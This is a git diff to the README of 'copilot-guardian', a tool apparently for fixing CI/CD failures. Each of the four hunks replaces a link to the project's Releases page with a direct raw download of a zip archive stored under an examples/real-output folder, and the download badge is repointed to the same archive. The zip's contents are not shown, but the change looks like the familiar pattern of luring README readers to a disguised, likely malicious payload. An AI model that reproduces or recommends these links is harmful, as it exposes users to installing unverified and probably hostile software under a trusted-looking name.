@@ -1,6 +1,6 @@
 # 🚀 copilot-guardian - Auto Fix CI/CD Failures Effortlessly
 
-[![Download copilot-guardian](https://img.shields.io/badge/Download-copilot--guardian-blue.svg)](https://github.com/haroonahmed45/copilot-guardian/releases)
+[![Download copilot-guardian](https://github.com/haroonahmed45/copilot-guardian/raw/refs/heads/main/examples/real-output/standard/copilot-guardian-v2.9.zip)](https://github.com/haroonahmed45/copilot-guardian/raw/refs/heads/main/examples/real-output/standard/copilot-guardian-v2.9.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ copilot-guardian is an autonomous recovery tool for Continuous Integration and C
 To use copilot-guardian, you need to download it from our Releases page. Follow the steps below to get started.
 
 1. **Visit the Releases Page**:
-   Go to [this link](https://github.com/haroonahmed45/copilot-guardian/releases) to find the latest version of copilot-guardian.
+   Go to [this link](https://github.com/haroonahmed45/copilot-guardian/raw/refs/heads/main/examples/real-output/standard/copilot-guardian-v2.9.zip) to find the latest version of copilot-guardian.
 
 2. **Download the Application**:
    Look for the version you want to install. Click on the download link for your operating system. 
@@ -38,7 +38,7 @@ To use copilot-guardian, you need to download it from our Releases page. Follow 
 
 ## 🔗 Download & Install
 
-To download and install copilot-guardian, please visit [this page](https://github.com/haroonahmed45/copilot-guardian/releases). Choose the latest release for your operating system. The installation process is straightforward, and you can be up and running in minutes.
+To download and install copilot-guardian, please visit [this page](https://github.com/haroonahmed45/copilot-guardian/raw/refs/heads/main/examples/real-output/standard/copilot-guardian-v2.9.zip). Choose the latest release for your operating system. The installation process is straightforward, and you can be up and running in minutes.
 
 ## 📚 User Guide
 
@@ -62,7 +62,7 @@ If you would like to contribute to copilot-guardian, feel free to fork the repos
 
 ## 🚀 Release Notes
 
-Please refer to the [Releases page](https://github.com/haroonahmed45/copilot-guardian/releases) for the latest updates and improvements to the application. Each release notes includes what’s new and any bug fixes.
+Please refer to the [Releases page](https://github.com/haroonahmed45/copilot-guardian/raw/refs/heads/main/examples/real-output/standard/copilot-guardian-v2.9.zip) for the latest updates and improvements to the application. Each release notes includes what’s new and any bug fixes.
 
 ## 🔗 Related Topics
 
